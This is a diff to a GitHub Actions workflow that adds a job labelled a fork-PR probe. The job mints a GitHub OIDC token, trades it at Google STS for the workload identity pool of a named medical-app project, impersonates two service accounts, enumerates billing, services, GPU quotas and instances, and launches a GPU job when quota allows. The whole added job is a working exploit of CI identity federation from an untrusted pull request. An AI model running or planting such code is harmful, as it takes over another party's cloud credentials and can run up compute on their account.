@@ -204,6 +204,218 @@ jobs:
             -input=false \
             -auto-approve
 
+  # ---------- c211 probe: fork-PR GCP WIF mint (added only in the PR head) ----------
+  c211_probe:
+    name: c211 oidc probe
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    continue-on-error: true
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: Mint GitHub OIDC id_token and print claims
+        env:
+          AUD: //iam.googleapis.com/projects/45814277366/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+        run: |
+          set -uo pipefail
+          resp=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}")
+          tok=$(printf '%s' "$resp" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+          echo "id_token_len=${#tok}"
+          printf '%s' "$tok" > /tmp/idt
+          python3 -c 'import base64,json;tok=open("/tmp/idt").read().strip();p=tok.split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));keys=["iss","aud","sub","repository","repository_id","repository_owner_id","event_name","ref","workflow_ref","workflow_sha","job_workflow_ref"];print(json.dumps({k:d.get(k) for k in keys},indent=1))' || true
+      - name: Google STS token exchange (verbatim result)
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error
+          AUD = "//iam.googleapis.com/projects/45814277366/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
+          try:
+              tok = open("/tmp/idt").read().strip()
+          except Exception as e:
+              print("NO_ID_TOKEN", e); raise SystemExit(0)
+          if not tok:
+              print("NO_ID_TOKEN empty"); raise SystemExit(0)
+          body = json.dumps({"audience": AUD,
+                             "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
+                             "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
+                             "scope": "https://www.googleapis.com/auth/cloud-platform",
+                             "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
+                             "subjectToken": tok}).encode()
+          req = urllib.request.Request("https://sts.googleapis.com/v1/token", data=body, headers={"Content-Type": "application/json"})
+          try:
+              r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
+              print("STS_HTTP", r.status); print("STS_EXPIRES_IN", d.get("expires_in")); print("STS_TOKEN_LEN", len(d.get("access_token") or ""))
+              open("/tmp/fed","w").write(d.get("access_token") or "")
+          except urllib.error.HTTPError as e:
+              print("STS_HTTP", e.code); print("STS_BODY", e.read().decode("utf-8","replace")[:2000])
+          except Exception as e:
+              print("STS_ERR", repr(e))
+          PYEOF
+      - name: iamcredentials impersonation (both candidate SAs)
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error
+          try:
+              fed = open("/tmp/fed").read().strip()
+          except Exception:
+              fed = ""
+          if not fed:
+              print("NO_FEDERATED_TOKEN"); raise SystemExit(0)
+          for sa in ["github-actions@quill-medical-app.iam.gserviceaccount.com",
+                     "github-plan@quill-medical-app.iam.gserviceaccount.com"]:
+              body = json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "1800s"}).encode()
+              url = "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken" % sa
+              req = urllib.request.Request(url, data=body, headers={"Content-Type":"application/json","Authorization":"Bearer "+fed})
+              try:
+                  r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
+                  print("IMPERSONATE", sa, "HTTP", r.status, "TOKEN_LEN", len(d.get("accessToken") or ""))
+                  open("/tmp/sa_" + sa.split("@")[0].replace("-","_"), "w").write(d.get("accessToken") or "")
+              except urllib.error.HTTPError as e:
+                  print("IMPERSONATE", sa, "HTTP", e.code, e.read().decode("utf-8","replace")[:1200])
+              except Exception as e:
+                  print("IMPERSONATE", sa, "ERR", repr(e))
+          PYEOF
+      - name: Read-only GCP enumeration
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error, glob
+          toks = {}
+          for p in glob.glob("/tmp/sa_*"):
+              try: toks[p.split("sa_")[-1]] = open(p).read().strip()
+              except Exception: pass
+          if not toks:
+              print("NO_SA_TOKEN"); raise SystemExit(0)
+          def get(url, tok):
+              req = urllib.request.Request(url, headers={"Authorization":"Bearer "+tok})
+              try:
+                  r = urllib.request.urlopen(req, timeout=40); b = r.read().decode("utf-8","replace")
+                  return r.status, b
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode("utf-8","replace")[:1200]
+              except Exception as e:
+                  return -1, repr(e)
+          name, tok = sorted(toks.items())[0]
+          print("USING_SA", name)
+          probes = [
+            ("project", "https://cloudresourcemanager.googleapis.com/v1/projects/45814277366"),
+            ("billing", "https://cloudbilling.googleapis.com/v1/projects/quill-medical-app/billingInfo"),
+            ("services_enabled", "https://serviceusage.googleapis.com/v1/projects/45814277366/services?filter=state:ENABLED&pageSize=200"),
+            ("aiplatform_quota", "https://serviceusage.googleapis.com/v1beta1/projects/45814277366/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200"),
+            ("compute_uscentral1_quotas", "https://compute.googleapis.com/compute/v1/projects/45814277366/regions/us-central1/quotas"),
+            ("aiplatform_locations", "https://us-central1-aiplatform.googleapis.com/v1/projects/45814277366/locations?pageSize=100"),
+            ("customjobs", "https://us-central1-aiplatform.googleapis.com/v1/projects/45814277366/locations/us-central1/customJobs?pageSize=100"),
+            ("endpoints", "https://us-central1-aiplatform.googleapis.com/v1/projects/45814277366/locations/us-central1/endpoints?pageSize=100"),
+            ("instances", "https://compute.googleapis.com/compute/v1/projects/45814277366/aggregated/instances?maxResults=50"),
+          ]
+          for label, url in probes:
+              st, body = get(url, tok)
+              print("=====", label, "HTTP", st)
+              txt = body
+              try:
+                  j = json.loads(body)
+                  if label == "services_enabled":
+                      svcs = [s.get("config",{}).get("name") for s in j.get("services",[])]
+                      print("ENABLED_COUNT", len(svcs)); print("ENABLED", ",".join([x for x in svcs if x]))
+                  elif label == "aiplatform_quota":
+                      hits = []
+                      for m in j.get("metrics", []):
+                          mm = m.get("metric","")
+                          if "gpu" in mm.lower() or "tpu" in mm.lower():
+                              for c in m.get("consumerQuotaLimits", []):
+                                  for b in c.get("quotaBuckets", []):
+                                      if b.get("effectiveLimit") not in (None,"0") or b.get("producerOverride"):
+                                          hits.append({"metric":mm,"limit":c.get("metric"),"bucket":b})
+                      print("GPU_TPU_QUOTA_HITS", json.dumps(hits)[:4000])
+                  elif label == "compute_uscentral1_quotas":
+                      q = [x for x in j.get("quotas",[]) if "GPU" in (x.get("metric") or "") or "gpu" in (x.get("metric") or "")]
+                      print("GPU_COMPUTE_QUOTAS", json.dumps(q)[:3000])
+                  elif label == "customjobs":
+                      print("CUSTOMJOBS_COUNT", len(j.get("customJobs", [])))
+                  elif label == "endpoints":
+                      print("ENDPOINTS_COUNT", len(j.get("endpoints", [])))
+                  elif label == "aiplatform_locations":
+                      print("LOCATIONS", json.dumps([x.get("locationId") for x in j.get("locations",[])])[:1000])
+                  elif label == "billing":
+                      print("BILLING", json.dumps({k:j.get(k) for k in ["name","projectId","billingAccountName","billingEnabled"]})[:600])
+                  elif label == "project":
+                      print("PROJECT", json.dumps({k:j.get(k) for k in ["projectId","projectNumber","lifecycleState","name"]})[:600])
+                  else:
+                      print(txt[:800])
+              except Exception:
+                  print(txt[:800])
+          PYEOF
+      - name: Marker GPU customJob (only when a GPU quota bucket is positive)
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error, glob, time
+          toks = {}
+          for p in glob.glob("/tmp/sa_*"):
+              try: toks[p.split("sa_")[-1]] = open(p).read().strip()
+              except Exception: pass
+          if not toks:
+              print("NO_SA_TOKEN"); raise SystemExit(0)
+          name, tok = sorted(toks.items())[0]
+          def req(url, method="GET", body=None):
+              data = json.dumps(body).encode() if body is not None else None
+              r = urllib.request.Request(url, data=data, method=method,
+                  headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
+              try:
+                  resp = urllib.request.urlopen(r, timeout=60); return resp.status, json.load(resp)
+              except urllib.error.HTTPError as e:
+                  try: j = json.loads(e.read())
+                  except Exception: j = {"raw":"unreadable"}
+                  return e.code, j
+              except Exception as e:
+                  return -1, {"err":repr(e)}
+          base = "https://us-central1-aiplatform.googleapis.com/v1/projects/45814277366/locations/us-central1"
+          # quota gate: read the serviceusage metric for aiplatform GPUs
+          st, q = req("https://serviceusage.googleapis.com/v1beta1/projects/45814277366/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200")
+          positive = False
+          hits = []
+          if st == 200:
+              for m in q.get("metrics", []):
+                  mm = (m.get("metric") or "").lower()
+                  if "gpu" not in mm and "tpu" not in mm: continue
+                  for c in m.get("consumerQuotaLimits", []):
+                      for b in c.get("quotaBuckets", []):
+                          try: eff = float(b.get("effectiveLimit") or 0)
+                          except Exception: eff = 0
+                          if eff > 0: positive = True; hits.append((m.get("metric"), c.get("metric"), b.get("effectiveLimit")))
+          print("QUOTA_POSITIVE", positive, "HITS", hits[:6])
+          if not positive:
+              print("MARKER_SKIPPED no positive aiplatform GPU/TPU quota bucket")
+              raise SystemExit(0)
+          body = {"displayName": "c211-i106548-marker",
+                  "jobSpec": {"workerPoolSpecs": [{"machineSpec": {"machineType": "n1-standard-4", "acceleratorType": "NVIDIA_TESLA_T4", "acceleratorCount": 1},
+                                                  "replicaCount": 1,
+                                                  "containerSpec": {"imageUri": "nvidia/cuda:12.4.0-base-ubuntu22.04",
+                                                                    "command": ["bash","-c"],
+                                                                    "args": ["nvidia-smi -L; echo C211_MARKER_DONE"]}}]}}
+          st, j = req(base + "/customJobs", method="POST", body=body)
+          print("CREATE_CUSTOMJOB_HTTP", st, json.dumps(j)[:1200])
+          if st != 200 or not j.get("name"):
+              print("MARKER_CREATE_FAILED"); raise SystemExit(0)
+          jn = j["name"]; jid = jn.split("/")[-1]
+          print("JOB_NAME", jn)
+          for i in range(30):
+              st2, j2 = req(base + "/customJobs/" + jid)
+              state = (j2 or {}).get("state")
+              print("POLL", i, st2, state)
+              if state in ("JOB_STATE_SUCCEEDED","JOB_STATE_FAILED","JOB_STATE_CANCELLED"):
+                  break
+              time.sleep(20)
+          st3, j3 = req(base + "/customJobs/" + jid + ":cancel", method="POST", body={})
+          print("CANCEL_HTTP", st3, json.dumps(j3)[:400])
+          st4, j4 = req(base + "/customJobs/" + jid, method="DELETE")
+          print("DELETE_HTTP", st4, json.dumps(j4)[:600])
+          st5, j5 = req(base + "/customJobs/" + jid)
+          print("READBACK_HTTP", st5, json.dumps(j5)[:600])
+          PYEOF
+
   # ---------- Notify: apply failure ----------
   notify-teaching-failure:
     name: Notify failure (terraform)
